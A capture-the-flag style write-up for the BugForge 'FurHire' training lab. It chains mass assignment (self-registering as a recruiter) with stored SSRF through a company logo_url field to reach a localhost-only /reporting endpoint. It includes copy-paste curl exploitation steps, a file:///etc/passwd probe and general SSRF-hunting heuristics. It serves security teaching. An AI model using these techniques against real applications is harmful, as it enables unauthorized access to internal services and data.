---
title: FurHire - SSRF
tags:
  - bugforge
  - ssrf
  - access-control-bypass
  - weekly
aliases:
  - "/bugforge/furhire-ssrf/"
  - "/BugForge/FurHire---SSRF"
---
- Chains mass assignment (register as recruiter) with stored SSRF via `logo_url` to bypass network-based access control on an internal reporting endpoint
- The trigger endpoint (`/api/company/:id/logo`) is undocumented - discovery requires understanding how the app consumes the stored URL

## Setup

Grab your URL from the lab page (it looks like `https://lab-1777969600705-poba1k.labs-app.bugforge.io/`) and export it so the commands below work copy-paste:

```bash
export TARGET="https://YOUR-LAB-URL.labs-app.bugforge.io"
```

Verify it's alive:

```bash
curl -s $TARGET/api/jobs | jq '.jobs[0].title'
# Should return a job title like "Guard Dog Coordinator"
```

## Enumeration

**Tech Stack**: Express.js, JWT auth (HS256, no expiry), SQLite, Socket.io

**Roles**: `user` (job seeker) and `recruiter` (posts jobs, manages company profile)

Key endpoints from recon:

```
POST /api/register            - role=user|recruiter (hidden field)
POST /api/login               - JWT in response
GET  /api/profile             - User + company data
PUT  /api/company             - Recruiter only: company_name, industry, location, website, logo_url, description
GET  /api/jobs/:id            - Shows company info including logo_url
GET  /api/company/:id/logo    - SSRF trigger (undocumented -- not in frontend JS)
GET  /reporting               - 403 from outside, accessible from localhost only
```

## Thought Process

### Finding the target: `/reporting`

Recon found no `/api/report*` in the frontend JS or HTML. Tried path guessing:

```bash
curl -s $TARGET/api/reporting     # 404
curl -s $TARGET/api/reports       # 404
curl -s $TARGET/reporting         # {"error":"Access denied"}
```

`/reporting` (no `/api` prefix) exists but returns 403 for every auth state - no token, user token, recruiter token. This is network-based access control (localhost only), not role-based.

### Confirming SSRF is the path

With a localhost-only endpoint confirmed, the question becomes: what feature makes the server issue HTTP requests on our behalf?

The `logo_url` field in `PUT /api/company` stores an arbitrary URL. The app displays company logos alongside job listings. Somewhere, the server must fetch that URL to serve the image. The question is: where?

### Finding the trigger: `/api/company/:id/logo`

This endpoint is NOT in the frontend source. The frontend just renders `<img src="/api/company/3/logo">` via a template, but the JavaScript never explicitly calls it. Discovery came from RESTful convention reasoning:

- Company is a resource at `/api/company`
- `logo` is a sub-resource of a company
- RESTful pattern: `/api/company/:id/logo` would serve the logo content

Tried:

| Path | Result | Conclusion |
|------|--------|------------|
| `GET /api/company/logo` | 404 | Needs an ID |
| `GET /api/company/3/logo` | 200 + fetched content | Server-side fetch confirmed |
| `POST /api/company/validate-logo` | 404 | No validation endpoint |

The server fetches whatever URL is stored in `logo_url` and returns the response body.

### Why recruiter role matters

`PUT /api/company` requires recruiter auth. Regular users can't set `logo_url`. The registration form has a hidden `<input value="user">` for role - sending `role=recruiter` in the POST body overrides it (mass assignment). This is the prerequisite.

## Exploitation

### Step 1: Register as Recruiter

```bash
curl -s $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"recruiter1","email":"rec@test.com","full_name":"Recruiter","password":"Password123!","role":"recruiter"}'
```
```json
{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {"id":7, "username":"recruiter1", "role":"recruiter"},
  "needsOnboarding": true
}
```

Save the token for subsequent requests. Copy the full `token` value from the response:

```bash
export TOKEN="eyJhbGciOiJIUzI1NiIs..."
```

Quick sanity check -- confirm you're a recruiter:

```bash
curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq '.user.role'
# "recruiter"
```

### Step 2: Store internal URL as logo

```bash
curl -s $TARGET/api/company \
  -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"company_name":"Test Corp","industry":"Tech","location":"Remote","website":"https://example.com","logo_url":"http://localhost:3000/reporting","description":"Testing"}'
```
```json
{"message":"Company updated successfully"}
```

Port 3000 is Express's default. Verify storage:

```bash
curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq .company.logo_url
# "http://localhost:3000/reporting"
```

### Step 3: Trigger the fetch

First, get your company ID (it's assigned on creation and differs per instance):

```bash
curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq .company.id
# e.g. 3
```

Then hit the logo endpoint with that ID:

```bash
curl -s "$TARGET/api/company/3/logo" \
  -H "Authorization: Bearer $TOKEN" | jq .
```
```json
{
  "jobs": [
    {"id":5, "title":"Test Job", "status":"open", "location":"Remote"},
    {"id":1, "title":"Guard Dog Coordinator", "status":"open"},
    {"id":2, "title":"Senior Fetch Specialist", "status":"open"},
    {"id":3, "title":"Chief Mousing Officer", "status":"open"},
    {"id":4, "title":"Therapy Cat Lead", "status":"open"}
  ],
  "applications": [],
  "flag": "bug{...}"
}
```

The server fetched `http://localhost:3000/reporting` from its own loopback -- bypassing the network ACL entirely.

## Dead Ends

| Attempt | Result | Lesson |
|---------|--------|--------|
| `/reporting` with `X-Forwarded-For: 127.0.0.1` | 403 | App doesn't trust proxy headers |
| `/reporting` with recruiter/admin JWT | 403 | ACL is IP-based, not role-based |
| `PUT /api/company` with extra fields | 500 DB error | SQLite rejects unknown columns |
| Checking job listings for reflected logo content | Raw URL stored, not fetched | Only the dedicated logo endpoint triggers the fetch |
| `logo_url` with `file:///etc/passwd` | Empty response | Fetch library likely HTTP-only |

## Attack Chain

```
Mass assignment: register with role=recruiter
         |
         v
PUT /api/company -- set logo_url = http://localhost:3000/reporting
         |
         v
GET /api/company/:id/logo -- server fetches stored URL
         |
         v
Server reads /reporting from loopback (bypasses network ACL)
         |
         v
Internal data returned: jobs, applications, flag
```

## Takeaways

**Classification**: CWE-918 (Server-Side Request Forgery), OWASP A10:2021

**Root causes**:
- No URL validation on `logo_url` -- accepts and fetches arbitrary destinations including private IPs
- Network ACL as sole protection -- `/reporting` has zero authentication, relies entirely on source IP
- Unnecessary server-side proxy -- `/api/company/:id/logo` fetches and forwards content instead of returning the URL for client-side `<img>` rendering

**Key patterns**:
1. "Access denied" + no auth bypass = look for SSRF. Network ACLs are trivially bypassed by any server-side fetch within the same application
2. URL-accepting fields (`logo_url`, `webhook_url`, `callback`, `avatar`) are SSRF candidates. The question is always: where does the server consume this URL?
3. Undocumented endpoints exist. RESTful convention (`/resource/:id/sub-resource`) is a reliable guessing heuristic when the trigger isn't in frontend source
4. Stored SSRF (write URL, trigger fetch separately) is common in image/avatar upload, webhooks, and import features. Look for the fetch trigger, not just the storage endpoint
5. Express defaults to port 3000 internally. When targeting localhost, try the framework's default port first
